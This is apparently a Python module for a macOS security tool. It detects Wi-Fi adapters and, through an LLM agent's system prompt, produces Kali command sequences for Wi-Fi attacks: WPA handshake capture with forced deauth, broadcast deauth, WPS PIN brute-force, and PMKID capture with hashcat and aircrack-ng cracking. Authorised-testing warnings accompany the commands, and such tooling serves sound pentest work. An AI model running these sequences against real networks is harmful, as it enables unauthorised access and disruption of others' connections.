import subprocess

KNOWN_ADAPTERS = {
    ("0cf3", "9271"): {
        "name": "TL-WN722N",
        "chipset": "AR9271",
        "monitor": True,
        "inject": True,
        "bands": "2.4 GHz",
        "kali_iface": "wlan0",
        "driver_note": "ath9k_htc — works out of the box on Kali.",
    },
    ("0bda", "8812"): {
        "name": "AWUS036ACH",
        "chipset": "RTL8812AU",
        "monitor": True,
        "inject": True,
        "bands": "2.4 / 5 GHz",
        "kali_iface": "wlan0",
        "driver_note": "Install driver in Kali: sudo apt install realtek-rtl88xxau-dkms",
    },
    ("0bda", "8179"): {
        "name": "TL-WN725N V3",
        "chipset": "RTL8188EU",
        "monitor": True,
        "inject": False,
        "bands": "2.4 GHz",
        "kali_iface": "wlan0",
        "driver_note": "Limited injection support — best used for passive monitoring only.",
    },
}

AIRPORT = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"

SYSTEM_PROMPT = """You are a Wi-Fi Security Analyst embedded in Sentinel — a macOS security command centre. You specialise in wireless network reconnaissance, adapter diagnostics, and offensive wireless tooling for authorised penetration testing.

─────────────────────────────────────────────
BEHAVIOUR
─────────────────────────────────────────────
When given raw output from a macOS Wi-Fi scan, interface report, signal monitor, or ping test, structure your response as follows:

1. SUMMARY
   - What the data shows in plain English
   - Interface name, hardware in use, current association status
   - Any immediately notable findings (weak signal, open networks, channel congestion)

2. NETWORK FINDINGS
   - List detected networks with SSID, BSSID, channel, signal strength (RSSI → quality %), security type
   - Flag open networks, WEP networks, or duplicate SSIDs (Evil Twin indicators)
   - Channel utilisation: which channels are congested, which are clear
   - Recommend channel changes if applicable

3. SECURITY OBSERVATIONS
   - Encryption types present (Open / WEP / WPA / WPA2 / WPA3)
   - Any anomalies: hidden SSIDs, unusually strong signals from unknown BSSIDs, deauth frames
   - Signal quality assessment: RSSI to percentage conversion (−30 dBm = 100 %, −90 dBm = 0 %)

4. RECOMMENDATIONS
   - Specific, actionable next steps
   - If a Kali adapter is connected: suggest relevant aircrack-ng commands for authorised testing
   - Network hardening advice for the target environment

─────────────────────────────────────────────
KALI COMMAND GENERATION
─────────────────────────────────────────────
When asked to generate Kali Linux commands, always:
- Number each step clearly
- Include the exact command with correct flags
- Add a one-line comment (# ...) explaining what each step does
- Note prerequisites (adapter in monitor mode, root access, driver installation)
- Include a ⚠️ WARNING: Only run these commands on networks you own or have written authorisation to test.

─────────────────────────────────────────────
TONE AND STANDARDS
─────────────────────────────────────────────
- Be precise and technical. Assume the user knows networking basics.
- Always include the authorisation disclaimer for offensive commands.
- Convert RSSI dBm values to percentage where helpful: quality = 2 × (RSSI + 100), clamped 0–100.
- Use tables where scan data has multiple fields (SSID, BSSID, CH, RSSI, Security).
"""


def detect_usb_adapters() -> list[dict]:
    """Scan USB bus for known Wi-Fi adapter VID/PID pairs. Returns list of adapter dicts."""
    try:
        result = subprocess.run(
            ["system_profiler", "SPUSBDataType", "-json"],
            capture_output=True, text=True, timeout=10,
        )
        import json
        data = json.loads(result.stdout)
        found = []
        _walk_usb(data, found)
        return found
    except Exception as e:
        return [{"error": str(e)}]


def _walk_usb(node, found: list):
    if isinstance(node, dict):
        vid = node.get("vendor_id", "").lower().replace("0x", "").zfill(4)
        pid = node.get("product_id", "").lower().replace("0x", "").zfill(4)
        key = (vid, pid)
        if key in KNOWN_ADAPTERS:
            info = dict(KNOWN_ADAPTERS[key])
            info["usb_name"] = node.get("_name", "Unknown")
            found.append(info)
        for v in node.values():
            _walk_usb(v, found)
    elif isinstance(node, list):
        for item in node:
            _walk_usb(item, found)


def build_kali_commands(operation: str, adapter: dict, bssid: str, channel: str, essid: str) -> str:
    iface = adapter.get("kali_iface", "wlan0")
    mon = f"{iface}mon"
    chipset = adapter.get("chipset", "")
    driver_note = adapter.get("driver_note", "")
    inject = adapter.get("inject", False)

    header = (
        f"# ── Kali Command Sequence ──────────────────────────────────────────\n"
        f"# Adapter : {adapter.get('name', 'Unknown')}  ({chipset})\n"
        f"# Interface: {iface}  →  monitor mode: {mon}\n"
        f"# Driver  : {driver_note}\n"
        f"# ⚠️  WARNING: Only run on networks you own or have written authorisation to test.\n"
        f"# ────────────────────────────────────────────────────────────────────\n\n"
    )

    bssid_val = bssid if bssid else "<TARGET_BSSID>"
    ch_val = channel if channel else "<CHANNEL>"
    essid_val = essid if essid else "<ESSID>"

    if operation == "Handshake Capture":
        steps = [
            ("Kill conflicting processes", "sudo airmon-ng check kill"),
            ("Put adapter into monitor mode", f"sudo airmon-ng start {iface}"),
            ("Survey all networks (find target channel/BSSID)", f"sudo airodump-ng {mon}"),
            (
                f"Lock onto target network (Ch {ch_val}, BSSID {bssid_val})",
                f"sudo airodump-ng -c {ch_val} --bssid {bssid_val} -w capture {mon}",
            ),
            (
                "Force a deauth to capture WPA handshake (run in a second terminal)",
                f"sudo aireplay-ng -0 10 -a {bssid_val} {mon}",
            ),
            (
                "Crack captured handshake against wordlist",
                "sudo aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt",
            ),
            ("Restore adapter to managed mode when done", f"sudo airmon-ng stop {mon}"),
        ]
    elif operation == "Deauth Attack":
        if not inject:
            return header + f"# ❌ {adapter.get('name')} ({chipset}) does not support packet injection.\n# Use TL-WN722N or AWUS036ACH for deauth attacks.\n"
        steps = [
            ("Kill conflicting processes", "sudo airmon-ng check kill"),
            ("Put adapter into monitor mode", f"sudo airmon-ng start {iface}"),
            (
                f"Monitor target to identify connected clients",
                f"sudo airodump-ng -c {ch_val} --bssid {bssid_val} {mon}",
            ),
            (
                "Deauth all clients from AP (broadcast — replace with client MAC for targeted)",
                f"sudo aireplay-ng -0 0 -a {bssid_val} {mon}",
            ),
            ("Restore adapter when done", f"sudo airmon-ng stop {mon}"),
        ]
    elif operation == "WPS Audit":
        steps = [
            ("Kill conflicting processes", "sudo airmon-ng check kill"),
            ("Put adapter into monitor mode", f"sudo airmon-ng start {iface}"),
            ("Scan for WPS-enabled access points", f"sudo wash -i {mon}"),
            (
                f"Run Reaver WPS PIN brute-force against target ({bssid_val})",
                f"sudo reaver -i {mon} -b {bssid_val} -vv",
            ),
            (
                "Alternative: Bully (often faster on locked APs)",
                f"sudo bully {mon} -b {bssid_val} -v 3",
            ),
            ("Restore adapter when done", f"sudo airmon-ng stop {mon}"),
        ]
    elif operation == "PMKID Attack":
        steps = [
            ("Kill conflicting processes", "sudo airmon-ng check kill"),
            ("Put adapter into monitor mode", f"sudo airmon-ng start {iface}"),
            (
                "Capture PMKID frames (no client deauth needed — runs passively)",
                f"sudo hcxdumptool -o pmkid.pcapng -i {mon} --enable_status=1",
            ),
            (
                "Convert capture to hashcat format",
                "sudo hcxpcapngtool -o hash.hc22000 -E essidlist pmkid.pcapng",
            ),
            (
                "Crack with hashcat (mode 22000)",
                "sudo hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt",
            ),
            ("Restore adapter when done", f"sudo airmon-ng stop {mon}"),
        ]
    else:
        steps = []

    lines = []
    for i, (comment, cmd) in enumerate(steps, 1):
        lines.append(f"# Step {i}: {comment}")
        lines.append(cmd)
        lines.append("")

    return header + "\n".join(lines)


class WiFiAgent:
    def __init__(self):
        self.name = "wifi"

    def build_messages(self, prompt: str) -> list[dict]:
        return [
            {"role": "system", "content": SYSTEM_PROMPT},
            {"role": "user", "content": prompt},
        ]
